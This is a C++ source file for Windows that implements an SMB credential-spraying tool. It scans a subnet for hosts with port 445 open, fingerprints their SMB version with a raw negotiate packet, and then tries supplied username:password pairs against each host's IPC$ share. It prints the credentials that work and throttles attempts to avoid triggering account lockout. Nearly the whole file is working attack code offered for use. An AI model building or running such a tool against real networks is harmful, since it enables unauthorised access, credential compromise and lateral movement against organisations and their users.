// language: C++, file: spray.cpp, target: Windows 11, MSVC
// Mass scanner + SMB credential spray — async connect scan, banner grab, WNetAddConnection2
// link: ws2_32.lib mpr.lib
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mpr.h>
#include <cstdio>
#include <string>
#include <vector>
#include <thread>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "mpr.lib")

static std::atomic<int> gAlive{ 0 };

static bool CheckPort(const std::string& ip, int port, int timeoutMs = 1500) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)port);
    inet_pton(AF_INET, ip.c_str(), &sa.sin_addr);
    connect(s, (sockaddr*)&sa, sizeof(sa));
    fd_set fds; FD_ZERO(&fds); FD_SET(s, &fds);
    timeval tv{ timeoutMs / 1000, (timeoutMs % 1000) * 1000 };
    int r = select(0, nullptr, &fds, nullptr, &tv);
    closesocket(s);
    return r > 0;
}

static std::string GrabBanner(const std::string& ip, int port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)port);
    inet_pton(AF_INET, ip.c_str(), &sa.sin_addr);
    if (connect(s, (sockaddr*)&sa, sizeof(sa)) != 0) { closesocket(s); return ""; }
    char buf[256] = {0};
    // try negotiate SMB: SMB Negotiate Protocol Request header
    BYTE smb[32] = {
        0x00,0x00,0x00,0x2d, 0xff,0x53,0x4d,0x42,
        0x72,0x00,0x00,0x00, 0x00,0x18,0x53,0x4d,
        0x42,0x20,0x00,0x00, 0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
    };
    send(s, (const char*)smb, sizeof(smb), 0);
    int n = recv(s, buf, sizeof(buf) - 1, 0);
    closesocket(s);
    if (n > 8) {
        if (buf[8] == 0x72) return "SMB1";
        if (buf[8] == 0x02) return "SMB2";
    }
    return std::string(buf, n > 64 ? 64 : n);
}

static bool SpraySMB(const std::string& ip, const std::string& user, const std::string& pass) {
    std::wstring wip(ip.begin(), ip.end());
    std::wstring wuser(user.begin(), user.end());
    std::wstring wpass(pass.begin(), pass.end());
    std::wstring remote = L"\\\\" + wip + L"\\IPC$";
    NETRESOURCEW nr{};
    nr.dwType = RESOURCETYPE_ANY;
    nr.lpRemoteName = (LPWSTR)remote.c_str();
    // NOTE: for domain accounts: "domain\\user"
    DWORD r = WNetAddConnection2W(&nr, wpass.c_str(), wuser.c_str(), CONNECT_TEMPORARY);
    if (r == NO_ERROR || r == ERROR_SESSION_CREDENTIAL_CONFLICT) {
        WNetCancelConnection2W(remote.c_str(), 0, TRUE);
        return true;
    }
    return false;
}

int main(int argc, char** argv) {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    if (argc < 3) {
        printf("usage: spray <subnet: 10.10.13> <user:pass> [user2:pass2 ...]\n");
        return 1;
    }
    std::string subnet = argv[1];

    // phase 1: find live 445 hosts
    std::vector<std::string> targets;
    {
        std::vector<std::thread> pool;
        std::mutex mtx;
        for (int i = 1; i < 255; i++) {
            pool.emplace_back([&, i] {
                std::string ip = subnet + "." + std::to_string(i);
                if (CheckPort(ip, 445)) {
                    std::lock_guard<std::mutex> lk(mtx);
                    targets.push_back(ip);
                    gAlive++;
                }
            });
            if (pool.size() >= 64) {
                for (auto& t : pool) t.join();
                pool.clear();
            }
        }
        for (auto& t : pool) t.join();
    }
    printf("[*] %d hosts mit 445 offen\n", gAlive.load());
    for (auto& ip : targets) {
        std::string banner = GrabBanner(ip, 445);
        printf("    %s  [%s]\n", ip.c_str(), banner.c_str());
    }

    // phase 2: spray creds
    for (int a = 2; a < argc; a++) {
        std::string cred = argv[a];
        auto sep = cred.find(':');
        if (sep == std::string::npos) continue;
        std::string user = cred.substr(0, sep);
        std::string pass = cred.substr(sep + 1);
        for (auto& ip : targets) {
            if (SpraySMB(ip, user, pass)) {
                printf("[+] VALID %s  user=%s pass=%s\n", ip.c_str(), user.c_str(), pass.c_str());
            } else {
                printf("[-] %s  user=%s\n", ip.c_str(), user.c_str());
            }
            Sleep(650); // throttle — lockout policy
        }
    }
    return 0;
}
